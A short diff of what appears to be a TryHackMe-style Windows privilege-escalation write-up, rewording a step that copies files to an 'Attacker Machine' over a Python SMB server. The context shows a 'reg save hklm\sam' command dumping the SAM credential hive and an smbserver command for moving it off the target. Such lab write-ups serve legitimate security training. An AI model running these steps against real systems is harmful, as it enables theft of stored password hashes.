@@ -45,7 +45,7 @@ C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
 
 <br/>
 
-- Copying the Files to the **Attacker Machine** using a simple `SMB` Server.
+- Copying the Files to the **Attacker Machine** using a **Python** `SMB` Server.
 
 ```bash
 attacker@machine:~$ smbserver $SHARE_NAME $DIRECTORY  
